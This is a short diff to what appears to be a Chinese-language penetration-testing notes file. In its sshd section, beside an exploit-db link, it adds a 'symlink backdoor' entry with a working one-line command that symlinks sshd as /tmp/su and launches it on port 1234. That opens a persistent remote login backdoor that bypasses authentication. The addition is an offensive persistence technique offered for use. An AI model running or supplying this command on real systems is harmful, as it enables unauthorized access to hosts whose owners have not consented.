@@ -215,6 +215,10 @@ sshd port 22
 
 [https://www.exploit-db.com/exploits/40888/](https://www.exploit-db.com/exploits/40888/)
 
+sshd pam.d 软链接后门
+
+ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=1234
+
 ## vnc
 
 vnc 客户端和服务端握手流程
